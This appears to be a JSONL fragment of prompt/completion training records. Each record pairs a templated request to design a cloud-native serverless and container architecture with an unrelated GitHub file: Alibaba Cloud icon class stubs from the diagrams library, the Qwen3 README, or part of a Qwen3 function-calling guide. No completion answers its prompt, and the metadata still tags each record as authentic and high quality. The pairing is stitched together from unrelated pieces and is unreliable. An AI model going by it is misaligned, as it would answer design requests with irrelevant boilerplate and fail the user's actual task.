\"graph-database-service.png\"\n\n\nclass HybriddbForMysql(_Database):\n    _icon = \"hybriddb-for-mysql.png\"\n\n\nclass RelationalDatabaseService(_Database):\n    _icon = \"relational-database-service.png\"\n\n\n# Aliases\n\nDMS = DataManagementService\nDTS = DataTransmissionService\nDBS = DatabaseBackupService\nDRDS = DisributeRelationalDatabaseService\nGDS = GraphDatabaseService\nRDS = RelationalDatabaseService\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/database.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 87}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Iot(_AlibabaCloud):\n    _type = \"iot\"\n    _icon_dir = \"resources/alibabacloud/iot\"\n\n\nclass IotInternetDeviceId(_Iot):\n    _icon = \"iot-internet-device-id.png\"\n\n\nclass IotLinkWan(_Iot):\n    _icon = \"iot-link-wan.png\"\n\n\nclass IotMobileConnectionPackage(_Iot):\n    _icon = \"iot-mobile-connection-package.png\"\n\n\nclass IotPlatform(_Iot):\n    _icon = \"iot-platform.png\"\n\n\n# Aliases\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/iot.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 28}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Network(_AlibabaCloud):\n    _type = \"network\"\n    _icon_dir = \"resources/alibabacloud/network\"\n\n\nclass Cdn(_Network):\n    _icon = \"cdn.png\"\n\n\nclass CloudEnterpriseNetwork(_Network):\n    _icon = \"cloud-enterprise-network.png\"\n\n\nclass ElasticIpAddress(_Network):\n    _icon = \"elastic-ip-address.png\"\n\n\nclass ExpressConnect(_Network):\n    _icon = \"express-connect.png\"\n\n\nclass NatGateway(_Network):\n    _icon = \"nat-gateway.png\"\n\n\nclass ServerLoadBalancer(_Network):\n    _icon = \"server-load-balancer.png\"\n\n\nclass SmartAccessGateway(_Network):\n    _icon = \"smart-access-gateway.png\"\n\n\nclass VirtualPrivateCloud(_Network):\n    _icon = \"virtual-private-cloud.png\"\n\n\nclass VpnGateway(_Network):\n    _icon = \"vpn-gateway.png\"\n\n\n# Aliases\n\nCEN = CloudEnterpriseNetwork\nEIP = ElasticIpAddress\nSLB = ServerLoadBalancer\nVPC = VirtualPrivateCloud\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/network.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 53}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Qwen3\n\n<p align=\"center\">\n    <img src=\"https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/logo_qwen3.png\" width=\"400\"/>\n<p>\n\n<p align=\"center\">\n          💜 <a href=\"https://chat.qwen.ai/\"><b>Qwen Chat</b></a>&nbsp&nbsp | &nbsp&nbsp🤗 <a href=\"https://huggingface.co/Qwen\">Hugging Face</a>&nbsp&nbsp | &nbsp&nbsp🤖 <a href=\"https://modelscope.cn/organization/qwen\">ModelScope</a>&nbsp&nbsp | &nbsp&nbsp 📑 <a href=\"https://arxiv.org/abs/2505.09388\">Paper</a> &nbsp&nbsp | &nbsp&nbsp 📑 <a href=\"https://qwenlm.github.io/blog/qwen3/\">Blog</a> &nbsp&nbsp ｜ &nbsp&nbsp📖 <a href=\"https://qwen.readthedocs.io/\">Documentation</a>\n<br>\n🖥️ <a href=\"https://huggingface.co/spaces/Qwen/Qwen3-Demo\">Demo</a>&nbsp&nbsp | &nbsp&nbsp💬 <a href=\"https://github.com/QwenLM/Qwen/blob/main/assets/wechat.png\">WeChat (微信)</a>&nbsp&nbsp | &nbsp&nbsp🫨 <a href=\"https://discord.gg/CV4E9rpNSD\">Discord</a>&nbsp&nbsp\n</p>\n\n\nVisit our Hugging Face or ModelScope organization (click links above), search checkpoints with names starting with `Qwen3-` or visit the [Qwen3 collection](https://huggingface.co/collections/Qwen/qwen3-67dd247413f0e2e4f653967f), and you will find all you need! Enjoy!\n\nTo learn more about Qwen3, feel free to read our documentation \\[[EN](https://qwen.readthedocs.io/en/latest/)|[ZH](https://qwen.readthedocs.io/zh-cn/latest/)\\]. Our documentation consists of the following sections:\n\n- Quickstart: the basic usages and demonstrations;\n- Inference: the guidance for the inference with Transformers, including batch inference, streaming, etc.;\n- Run Locally: the instructions for running LLM locally on CPU and GPU, with frameworks like llama.cpp and Ollama;\n- Deployment: the demonstration of how to deploy Qwen for large-scale inference with frameworks like SGLang, vLLM, TGI, etc.;\n- Quantization: the practice of quantizing LLMs with GPTQ, AWQ, as well as the guidance for how to make high-quality quantized GGUF files;\n- Training: the instructions for post-training, including SFT and RLHF (TODO) with frameworks like Axolotl, LLaMA-Factory, etc.\n- Framework: the usage of Qwen with frameworks for application, e.g., RAG, Agent, etc.\n\n## Introduction\n\n### Qwen3-Instruct-2507\n\nWe are excited to introduce the updated version of the **Qwen3-235B-A22B non-thinking mode**, named **Qwen3-235B-A22B-Instruct-2507**, featuring the following key enhancements:  \n\n- **Significant improvements** in general capabilities, including **instruction following, logical reasoning, text comprehension, mathematics, science, coding and tool usage**.  \n- **Substantial gains** in long-tail knowledge coverage across **multiple languages**.  \n- **Markedly better alignment** with user preferences in **subjective and open-ended tasks**, enabling more helpful responses and higher-quality text generation.  \n- **Enhanced capabilities** in **256K-token long-context understanding**.\n\n![Qwen3-235B-A22B-Instruct-2507](https://qianwen-res.oss-accelerate.aliyuncs.com/Qwen3-235B-A22B-Instruct-2507.jpeg)\n\n### Qwen3-Thinking-2507\n\nOver the past three months, we have continued to scale the **thinking capability** of Qwen3-235B-A22B, improving both the **quality and depth** of reasoning. We are pleased to introduce **Qwen3-235B-A22B-Thinking-2507**, featuring the following key enhancements:\n- **Significantly improved performance** on reasoning tasks, including logical reasoning, mathematics, science, coding, and academic benchmarks that typically require human expertise — achieving **state-of-the-art results among open-source thinking models**.\n- **Markedly better general capabilities**, such as instruction following, tool usage, text generation, and alignment with human preferences.\n- **Enhanced 256K long-context understanding** capabilities.\n\n![Qwen3-235B-A22B-Thinking-2507](https://qianwen-res.oss-cn-beijing.aliyuncs.com/Qwen3-2507/Qwen3-235B-A22B-Thinking-2507.jpeg)\n\n> [!Important]\n> This version has an increased thinking length. We strongly recommend its use in highly complex reasoning tasks with adequate maximum generation length.\n\n\nThe updated versions of **more Qwen3 model sizes** are also expected to be released very soon. Stay tuned🚀\n\n### Qwen3\n<details>\n    <summary><b>Previous Qwen3 Release</b></summary>\n    <p>\n    We are excited to announce the release of Qwen3, the latest addition to the Qwen family of large language models. \n    These models represent our most advanced and intelligent systems to date, improving from our experience in building QwQ and Qwen2.5.\n    We are making the weights of Qwen3 available to the public, including both dense and Mixture-of-Expert (MoE) models. \n    <br><br>\n    The highlights from Qwen3 include:\n        <ul>\n            <li><b>Dense and Mixture-of-Experts (MoE) models of various sizes</b>, available in 0.6B, 1.7B, 4B, 8B, 14B, 32B and 30B-A3B, 235B-A22B.</li>\n            <li><b>Seamless switching between thinking mode</b> (for complex logical reasoning, math, and coding) and <b>non-thinking mode</b> (for efficient, general-purpose chat), ensuring optimal performance across various scenarios.</li>\n            <li><b>Significantly enhancement in reasoning capabilities</b>, surpassing previous QwQ (in thinking mode) and Qwen2.5 instruct models (in non-thinking mode) on mathematics, code generation, and commonsense logical reasoning.</li>\n            <li><b>Superior human preference alignment</b>, excelling in creative writing, role-playing, multi-turn dialogues, and instruction following, to deliver a more natural, engaging, and immersive conversational experience.</li>\n            <li><b>Expertise in agent capabilities</b>, enabling precise integration with external tools in both thinking and unthinking modes and achieving leading performance among open-source models in complex agent-based tasks.</li>\n            <li><b>Support of 100+ languages and dialects</b> with strong capabilities for <b>multilingual instruction following</b> and <b>translation</b>.</li>\n        </ul>\n    </p>\n</details>\n\n\n## News\n\n- 2025.07.25: We released the updated version of Qwen3-235B-A22B thinking mode, named Qwen3-235B-A22B-Thinking-2507. Check out the [modelcard](https://huggingface.co/Qwen/Qwen3-235B-A22B-Thinking-2507) for more details!\n- 2025.07.21: We released the updated version of Qwen3-235B-A22B non-thinking mode, named Qwen3-235B-A22B-Instruct-2507, featuring significant enhancements over the previous version and supporting 256K-token long-context understanding. Check our [modelcard](https://huggingface.co/Qwen/Qwen3-235B-A22B-Instruct-2507) for more details!\n- 2025.04.29: We released the Qwen3 series. Check our [blog](https://qwenlm.github.io/blog/qwen3) for more details!\n- 2024.09.19: We released the Qwen2.5 series. This time there are 3 extra model sizes: 3B, 14B, and 32B for more possibilities. Check our [blog](https://qwenlm.github.io/blog/qwen2.5) for more!\n- 2024.06.06: We released the Qwen2 series. Check our [blog](https://qwenlm.github.io/blog/qwen2/)!\n- 2024.03.28: We released the first MoE model of Qwen: Qwen1.5-MoE-A2.7B! Temporarily, only HF transformers and vLLM support the model. We will soon add the support of llama.cpp, mlx-lm, etc. Check our [blog](https://qwenlm.github.io/blog/qwen-moe/) for more information!\n- 2024.02.05: We released the Qwen1.5 series.\n\n## Performance\n\nDetailed evaluation results are reported in this [📑 blog](https://qwenlm.github.io/blog/qwen3/).\n\nFor requirements on GPU memory and the respective throughput, see results [here](https://qwen.readthedocs.io/en/latest/getting_started/speed_benchmark.html).\n\n## Run Qwen3\n\n### 🤗 Transformers\n\nTransformers is a library of pretrained natural language processing for inference and training. \nThe latest version of `transformers` is recommended and `transformers>=4.51.0` is required.\n\n#### Qwen3 Instruct\n\nThe following contains a code snippet illustrating how to use Qwen3-235B-A22B-Instruct-2507 to generate content based on given inputs. \n```python\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\n\nmodel_name = \"Qwen/Qwen3-235B-A22B-Instruct-2507\"\n\n# load the tokenizer and the model\ntokenizer = AutoTokenizer.from_pretrained(model_name)\nmodel = AutoModelForCausalLM.from_pretrained(\n    model_name,\n    torch_dtype=\"auto\",\n    device_map=\"auto\"\n)\n\n# prepare the model input\nprompt = \"Give me a short introduction to large language model.\"\nmessages = [\n    {\"role\": \"user\", \"content\": prompt}\n]\ntext = tokenizer.apply_chat_template(\n    messages,\n    tokenize=False,\n    add_generation_prompt=True,\n)\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\n\n# conduct text completion\ngenerated_ids = model.generate(\n    **model_inputs,\n    max_new_tokens=16384\n)\noutput_ids = generated_ids[0][len(model_inputs.input_ids[0]):].tolist() \n\ncontent = tokenizer.decode(output_ids, skip_special_tokens=True)\n\nprint(\"content:\", content)\n```\n\n> [!Note]\n> The updated version of Qwen3-235B-A22B, namely **Qwen3-235B-A22B-Instruct-2507** supports **only non-thinking mode** and **does not generate ``<think></think>`` blocks** in its output. Meanwhile, **specifying `enable_thinking=False` is no longer required**.\n\n\n#### Qwen3 Thinking\n\nThe following contains a code snippet illustrating how to use Qwen3-235B-A22B-Thinking-2507 to generate content based on given inputs. \n```python\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\n\nmodel_name = \"Qwen/Qwen3-235B-A22B-Thinking-2507\"\n\n# load the tokenizer and the model\ntokenizer = AutoTokenizer.from_pretrained(model_name)\nmodel = AutoModelForCausalLM.from_pretrained(\n    model_name,\n    torch_dtype=\"auto\",\n    device_map=\"auto\"\n)\n\n# prepare the model input\nprompt = \"Give me a short introduction to large language model.\"\nmessages = [\n    {\"role\": \"user\", \"content\": prompt}\n]\ntext = tokenizer.apply_chat_template(\n    messages,\n    tokenize=False,\n    add_generation_prompt=True,\n)\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\n\n# conduct text completion\ngenerated_ids = model.generate(\n    **model_inputs,\n    max_new_tokens=32768\n)\noutput_ids = generated_ids[0][len(model_inputs.input_ids[0]):].tolist() \n\n# parsing thinking content\ntry:\n    # rindex finding 151668 (</think>)\n    index = len(output_ids) - output_ids[::-1].index(151668)\nexcept ValueError:\n    index = 0\n\nthinking_content = tokenizer.decode(output_ids[:index], skip_special_tokens=True).strip(\"\\n\")\ncontent = tokenizer.decode(output_ids[index:], skip_special_tokens=True).strip(\"\\n\")\n\nprint(\"thinking content:\", thinking_content)  # no opening <think> tag\nprint(\"content:\", content)\n\n```\n\n> [!Note]\n> The updated version of Qwen3-235B-A22B, namely **Qwen3-235B-A22B-Thinking-2507** supports **only thinking mode**.\n> Additionally, to enforce model thinking, the default chat template automatically includes `<think>`. Therefore, it is normal for the model's output to contain only `</think>` without an explicit opening `<think>` tag.\n\n\n<details>\n    <summary><b>Switching Thinking/Non-thinking Modes for Previous Qwen3 Hybrid Models</b></summary>\n    <p>\n    By default, Qwen3 models will think before response.\n    This could be controlled by\n        <ul>\n            <li><code>enable_thinking=False</code>: Passing <code>enable_thinking=False</code> to `tokenizer.apply_chat_template` will strictly prevent the model from generating thinking content.</li>\n            <li><code>/think</code> and <code>/no_think</code> instructions: Use those words in the system or user message to signify whether Qwen3 should think. In multi-turn conversations, the latest instruction is followed.</li>\n        </ul>\n    </p>\n</details>\n\n\n### ModelScope\n\nWe strongly advise users especially those in mainland China to use ModelScope. \nModelScope adopts a Python API similar to Transformers.\nThe CLI tool `modelscope download` can help you solve issues concerning downloading checkpoints.\n\n\n### llama.cpp\n\n[`llama.cpp`](https://github.com/ggml-org/llama.cpp) enables LLM inference with minimal setup and state-of-the-art performance on a wide range of hardware.\n`llama.cpp>=b5092` is required for the support of Qwen3 architecture.\n`llama.cpp>=b5401` is recommended for the full support of the official Qwen3 chat template.\n\nTo use the CLI, run the following in a terminal:\n```shell\n./llama-cli -hf Qwen/Qwen3-8B-GGUF:Q8_0 --jinja --color -ngl 99 -fa -sm row --temp 0.6 --top-k 20 --top-p 0.95 --min-p 0 -c 40960 -n 32768 --no-context-shift\n# CTRL+C to exit\n```\n\nTo use the API server, run the following in a terminal:\n```shell\n./llama-server -hf Qwen/Qwen3-8B-GGUF:Q8_0 --jinja --reasoning-format deepseek -ngl 99 -fa -sm row --temp 0.6 --top-k 20 --top-p 0.95 --min-p 0 -c 40960 -n 32768 --no-context-shift --port 8080\n```\nA simple web front end will be at `http://localhost:8080` and an OpenAI-compatible API will be at `http://localhost:8080/v1`.\n\nFor additional guides, please refer to [our documentation](https://qwen.readthedocs.io/en/latest/run_locally/llama.cpp.html).\n\n> [!TIP]\n> llama.cpp adopts \"rotating context management\" and infinite generation is made possible by evicting earlier tokens.\n> It could configured by parameters and the commands above effectively disable it.\n> For more details, please refer to [our documentation](https://qwen.readthedocs.io/en/latest/run_locally/llama.cpp.html#llama-cli).\n\n### Ollama\n\nAfter [installing Ollama](https://ollama.com/), you can initiate the Ollama service with the following command (Ollama v0.6.6 or higher is required):\n```shell\nollama serve\n# You need to keep this service running whenever you are using ollama\n```\n\nTo pull a model checkpoint and run the model, use the `ollama run` command. You can specify a model size by adding a suffix to `qwen3`, such as `:8b` or `:30b-a3b`:\n```shell\nollama run qwen3:8b\n# Setting parameters, type \"/set parameter num_ctx 40960\" and \"/set parameter num_predict 32768\"\n# To exit, type \"/bye\" and press ENTER\n```\n\nYou can also access the Ollama service via its OpenAI-compatible API. \nPlease note that you need to (1) keep `ollama serve` running while using the API, and (2) execute `ollama run qwen3:8b` before utilizing this API to ensure that the model checkpoint is prepared.\nThe API is at `http://localhost:11434/v1/` by default.\n\nFor additional details, please visit [ollama.ai](https://ollama.com/).\n\n> [!TIP]\n> Ollama adopts the same \"rotating context management\" with llama.cpp.\n> However, its default settings (`num_ctx` 2048 and `num_predict` -1), suggesting infinite generation with a 2048-token context,\n> could lead to trouble for Qwen3 models.\n> We recommend setting `num_ctx` and `num_predict` properly.\n\n### LMStudio\n\nQwen3 has already been supported by [lmstudio.ai](https://lmstudio.ai/). You can directly use LMStudio with our GGUF files.\n\n### ExecuTorch\n\nTo export and run on ExecuTorch (iOS, Android, Mac, Linux, and more), please follow this [example](https://github.com/pytorch/executorch/blob/main/examples/models/qwen3/README.md).\n\n### MNN\n\nTo export and run on MNN, which supports Qwen3 on mobile devices, please visit [Alibaba MNN](https://github.com/alibaba/MNN).\n\n### MLX LM\n\nIf you are running on Apple Silicon, [`mlx-lm`](https://github.com/ml-explore/mlx-lm) also supports Qwen3 (`mlx-lm>=0.24.0`). \nLook for models ending with MLX on Hugging Face Hub.\n\n\n### OpenVINO\n\nIf you are running on Intel CPU or GPU, [OpenVINO toolkit](https://github.com/openvinotoolkit) supports Qwen3.\nYou can follow this [chatbot example](https://github.com/openvinotoolkit/openvino_notebooks/blob/latest/notebooks/llm-chatbot/llm-chatbot.ipynb).\n\n\n<!-- ### Text generation web UI\n\nYou can directly use [`text-generation-webui`](https://github.com/oobabooga/text-generation-webui) for creating a web UI demo. If you use GGUF, remember to install the latest wheel of `llama.cpp` with the support of Qwen2.5. -->\n\n\n<!-- ### llamafile\n\nClone [`llamafile`](https://github.com/Mozilla-Ocho/llamafile), run source install, and then create your own llamafile with the GGUF file following the guide [here](https://github.com/Mozilla-Ocho/llamafile?tab=readme-ov-file#creating-llamafiles). You are able to run one line of command, say `./qwen.llamafile`, to create a demo. -->\n\n\n## Deploy Qwen3\n\nQwen3 is supported by multiple inference frameworks. \nHere we demonstrate the usage of `SGLang`, `vLLM` and `TensorRT-LLM`.\nYou can also find Qwen3 models from various inference providers, e.g., [Alibaba Cloud Model Studio](https://www.alibabacloud.com/en/product/modelstudio).\n\n### SGLang\n\n[SGLang](https://github.com/sgl-project/sglang) is a fast serving framework for large language models and vision language models.\nSGLang could be used to launch a server with OpenAI-compatible API service. \n`sglang>=0.4.6.post1` is required.\nIt is as easy as\n```shell\npython -m sglang.launch_server --model-path Qwen/Qwen3-8B --port 30000 --reasoning-parser qwen3\n```\nAn OpenAI-compatible API will be available at `http://localhost:30000/v1`.\n\n> [!Note]\n> For Qwen3-Thinking-2507, e.g., Qwen3-235B-A22B-Thinking-2507, please use the following command at the moment:\n> ```shell\n> python -m sglang.launch_server --model-path Qwen/Qwen3-235B-A22B-Thinking-2507 --port 30000 --tp 8 --context-length 262144  --reasoning-parser deepseek-r1\n> ```\n\n### vLLM\n\n[vLLM](https://github.com/vllm-project/vllm) is a high-throughput and memory-efficient inference and serving engine for LLMs.\n`vllm>=0.9.0` is recommended.\n\n```shell\nvllm serve Qwen/Qwen3-8B --port 8000 --enable-reasoning --reasoning-parser qwen3\n```\nAn OpenAI-compatible API will be available at `http://localhost:8000/v1`.\n\n> [!Note]\n> For Qwen3-Thinking-2507, e.g., Qwen3-235B-A22B-Thinking-2507, please use the following command at the moment:\n> ```shell\n> vllm serve Qwen/Qwen3-235B-A22B-Thinking-2507 --port 8000 --tensor-parallel-size 8 --max-model-len 262144 --enable-reasoning --reasoning-parser deepseek_r1\n> ```\n\n\n### TensorRT-LLM\n\n[TensorRT-LLM](https://github.com/NVIDIA/TensorRT-LLM) is an open-source LLM inference engine from NVIDIA, which provides optimizations including custom attention kernels, quantization and more on NVIDIA GPUs. Qwen3 is supported in its re-architected [PyTorch backend](https://nvidia.github.io/TensorRT-LLM/torch.html). `tensorrt_llm>=0.20.0rc3` is recommended. Please refer to the [README](https://github.com/NVIDIA/TensorRT-LLM/blob/main/examples/models/core/qwen/README.md#qwen3) page for more details.\n\n```shell\ntrtllm-serve Qwen/Qwen3-8B --host localhost --port 8000 --backend pytorch\n```\nAn OpenAI-compatible API will be available at `http://localhost:8000/v1`.\n\n### MindIE\n\nFor deployment on Ascend NPUs, please visit [Modelers](https://modelers.cn/) and search for Qwen3.\n\n<!-- \n### OpenLLM\n\n[OpenLLM](https://github.com/bentoml/OpenLLM) allows you to easily run Qwen2.5 as OpenAI-compatible APIs. You can start a model server using `openllm serve`. For example:\n\n```bash\nopenllm serve qwen2.5:7b\n```\n\nThe server is active at `http://localhost:3000/`, providing OpenAI-compatible APIs. You can create an OpenAI client to call its chat API. For more information, refer to [our documentation](https://qwen.readthedocs.io/en/latest/deployment/openllm.html). -->\n\n\n## Build with Qwen3\n\n### Tool Use\n\nFor tool use capabilities, we recommend taking a look at [Qwen-Agent](https://github.com/QwenLM/Qwen-Agent), which provides a wrapper around these APIs to support tool use or function calling with MCP support.\nTool use with Qwen3 can also be conducted with SGLang, vLLM, Transformers, llama.cpp, Ollama, etc.\nFollow guides in our documentation to see how to enable the support.\n\n\n### Finetuning\n\nWe advise you to use training frameworks, including [Axolotl](https://github.com/OpenAccess-AI-Collective/axolotl), [UnSloth](https://github.com/unslothai/unsloth), [Swift](https://github.com/modelscope/swift), [Llama-Factory](https://github.com/hiyouga/LLaMA-Factory), etc., to finetune your models with SFT, DPO, GRPO, etc.\n\n\n## License Agreement\n\nAll our open-weight models are licensed under Apache 2.0. \nYou can find the license files in the respective Hugging Face repositories.\n\n## Citation\n\nIf you find our work helpful, feel free to give us a cite.\n\n```bibtex\n@article{qwen3,\n    title={Qwen3 Technical Report}, \n    author={An Yang and Anfeng Li and Baosong Yang and Beichen Zhang and Binyuan Hui and Bo Zheng and Bowen Yu and Chang Gao and Chengen Huang and Chenxu Lv and Chujie Zheng and Dayiheng Liu and Fan Zhou and Fei Huang and Feng Hu and Hao Ge and Haoran Wei and Huan Lin and Jialong Tang and Jian Yang and Jianhong Tu and Jianwei Zhang and Jianxin Yang and Jiaxi Yang and Jing Zhou and Jingren Zhou and Junyang Lin and Kai Dang and Keqin Bao and Kexin Yang and Le Yu and Lianghao Deng and Mei Li and Mingfeng Xue and Mingze Li and Pei Zhang and Peng Wang and Qin Zhu and Rui Men and Ruize Gao and Shixuan Liu and Shuang Luo and Tianhao Li and Tianyi Tang and Wenbiao Yin and Xingzhang Ren and Xinyu Wang and Xinyu Zhang and Xuancheng Ren and Yang Fan and Yang Su and Yichang Zhang and Yinger Zhang and Yu Wan and Yuqiong Liu and Zekun Wang and Zeyu Cui and Zhenru Zhang and Zhipeng Zhou and Zihan Qiu},\n    journal = {arXiv preprint arXiv:2505.09388},\n    year={2025}\n}\n\n@article{qwen2.5,\n    title   = {Qwen2.5 Technical Report}, \n    author  = {An Yang and Baosong Yang and Beichen Zhang and Binyuan Hui and Bo Zheng and Bowen Yu and Chengyuan Li and Dayiheng Liu and Fei Huang and Haoran Wei and Huan Lin and Jian Yang and Jianhong Tu and Jianwei Zhang and Jianxin Yang and Jiaxi Yang and Jingren Zhou and Junyang Lin and Kai Dang and Keming Lu and Keqin Bao and Kexin Yang and Le Yu and Mei Li and Mingfeng Xue and Pei Zhang and Qin Zhu and Rui Men and Runji Lin and Tianhao Li and Tingyu Xia and Xingzhang Ren and Xuancheng Ren and Yang Fan and Yang Su and Yichang Zhang and Yu Wan and Yuqiong Liu and Zeyu Cui and Zhenru Zhang and Zihan Qiu},\n    journal = {arXiv preprint arXiv:2412.15115},\n    year    = {2024}\n}\n\n@article{qwen2,\n    title   = {Qwen2 Technical Report}, \n    author  = {An Yang and Baosong Yang and Binyuan Hui and Bo Zheng and Bowen Yu and Chang Zhou and Chengpeng Li and Chengyuan Li and Dayiheng Liu and Fei Huang and Guanting Dong and Haoran Wei and Huan Lin and Jialong Tang and Jialin Wang and Jian Yang and Jianhong Tu and Jianwei Zhang and Jianxin Ma and Jin Xu and Jingren Zhou and Jinze Bai and Jinzheng He and Junyang Lin and Kai Dang and Keming Lu and Keqin Chen and Kexin Yang and Mei Li and Mingfeng Xue and Na Ni and Pei Zhang and Peng Wang and Ru Peng and Rui Men and Ruize Gao and Runji Lin and Shijie Wang and Shuai Bai and Sinan Tan and Tianhang Zhu and Tianhao Li and Tianyu Liu and Wenbin Ge and Xiaodong Deng and Xiaohuan Zhou and Xingzhang Ren and Xinyu Zhang and Xipin Wei and Xuancheng Ren and Yang Fan and Yang Yao and Yichang Zhang and Yu Wan and Yunfei Chu and Yuqiong Liu and Zeyu Cui and Zhenru Zhang and Zhihao Fan},\n    journal = {arXiv preprint arXiv:2407.10671},\n    year    = {2024}\n}\n```\n\n## Contact Us\nIf you are interested to leave a message to either our research team or product team, join our [Discord](https://discord.gg/z3GAxXZ9Ce) or [WeChat groups](assets/wechat.png)!\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 23335, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 416}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\r\nmyst:\r\n  number_code_blocks: [\"python3\"]\r\n---\r\n\r\n# Function Calling\r\n\r\n\r\n## Preface\r\n\r\nFunction calling with large language models is a huge and evolving topic.\r\nIt is particularly important for AI applications: \r\n- either for AI-native applications that strive to work around the shortcomings of current AI technology, \r\n- or for existing applications that seeks the integration of AI technology to improve performance, user interaction and experience, or efficiency.\r\n\r\nWe will talk about how Qwen3 can be used to support function calling and how it can be used to achieve your goals, from the inference usage for developing application to the inner workings for hardcore customizations. \r\nIn this guide, \r\n- We will first demonstrate how to use function calling with Qwen3.\r\n- Then, we will introduce the technical details on functional calling with Qwen3, which are mainly about the templates.\r\n\r\nBefore starting, there is one thing we have not yet introduced, that is ...\r\n\r\n## What is function calling?\r\n\r\n:::{Note}\r\nThere is another term \"tool use\" that may be used to refer to the same concept.\r\nWhile some may argue that tools are a generalized form of functions, at present, their difference exists only technically as different I/O types of programming interfaces.\r\n:::\r\n\r\nLarge language models (LLMs) are powerful things.\r\nHowever, sometimes LLMs by themselves are simply not capable enough.\r\n- On the one hand, LLMs have inherent modeling limitations. \r\n  For one, they do not know things that are not in their training data, which include those happened after their training ended.\r\n  In addition, they learn things in the way of likelihood, which suggests that they may not be precise enough for tasks with fixed rule sets, e.g., mathematical computation.\r\n- On the other hand, it is not easy to use LLMs as a Plug-and-Play service programmatically with other things.\r\n  LLMs mostly talk in words that are open to interpretation and thus ambiguous, while other software or applications or systems talk in code and through programming interfaces that are pre-defined and fixed and structured.\r\n\r\nTo this end, function calling establishes a common protocol that specifies how LLMs should interact with the other things.\r\nThe procedure is mainly as follows:\r\n1. The application provides a set of functions and the instructions of the functions to an LLM.\r\n2. The LLM choose to or not to, or is forced to use one or many of the functions, in response to user queries.\r\n3. If the LLM chooses to use the functions, it states how the functions should be used based on the function instructions.\r\n4. The chosen functions are used as such by the application and the results are obtained, which are then given to the LLM if further interaction is needed.\r\n\r\nThere are many ways for LLMs to understand and follow this protocol.\r\nAs always, the key is prompt engineering or an internalized template known by the model.\r\nWe recommend using Hermes-style tool use for Qwen3 to maximize function calling performance.\r\n\r\n## Inference with Function Calling\r\n\r\nAs function calling is essentially implemented using prompt engineering, you could manually construct the model inputs for Qwen3 models.\r\nHowever, frameworks with function calling support can help you with all that laborious work.\r\n\r\nIn the following, we will introduce the usage (via dedicated function calling chat template) with\r\n- **Qwen-Agent**,\r\n- **vLLM**.\r\n\r\n### The Example Case\r\n\r\nLet's also use an example to demonstrate the inference usage.\r\nWe assume **Python 3.11** is used as the programming language.\r\n\r\n**Scenario**: Suppose we would like to ask the model about the temperature of a location.\r\nNormally, the model would reply that it cannot provide real-time information.\r\nBut we have two tools that can be used to obtain the current temperature of and the temperature at a given date of a city respectively, and we would like the model to make use of them.\r\n\r\nTo set up the example case, you can use the following code:\r\n\r\n:::{dropdown} Preparation Code\r\n:name: prepcode\r\n\r\n```python\r\nimport json\r\n\r\ndef get_current_temperature(location: str, unit: str = \"celsius\"):\r\n    \"\"\"Get current temperature at a location.\r\n\r\n    Args:\r\n        location: The location to get the temperature for, in the format \"City, State, Country\".\r\n        unit: The unit to return the temperature in. Defaults to \"celsius\". (choices: [\"celsius\", \"fahrenheit\"])\r\n\r\n    Returns:\r\n        the temperature, the location, and the unit in a dict\r\n    